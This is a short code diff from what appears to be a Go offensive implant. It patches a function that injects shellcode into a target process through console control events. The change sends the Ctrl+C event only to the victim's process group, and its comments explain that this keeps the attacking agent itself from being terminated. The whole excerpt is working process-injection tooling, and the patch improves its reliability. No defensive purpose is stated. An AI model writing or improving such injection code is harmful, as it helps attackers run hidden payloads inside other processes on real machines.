@@ -306,14 +306,16 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Attached to target console\n"
 
 	// Step 14: Generate Ctrl+C event
+	// IMPORTANT: Use target PID as process group ID, NOT 0
+	// Using 0 would send Ctrl+C to ALL processes on the console, including our agent!
 	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(
 		uintptr(CTRL_C_EVENT),
-		0, // Send to all processes in console group
+		uintptr(pid), // Send only to target's process group
 	)
 	if ret == 0 {
 		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent warning: %v\n", ctrlErr)
 	} else {
-		output += "[+] Generated CTRL_C_EVENT\n"
+		output += fmt.Sprintf("[+] Generated CTRL_C_EVENT to process group %d\n", pid)
 	}
 
 	// Detach from target console
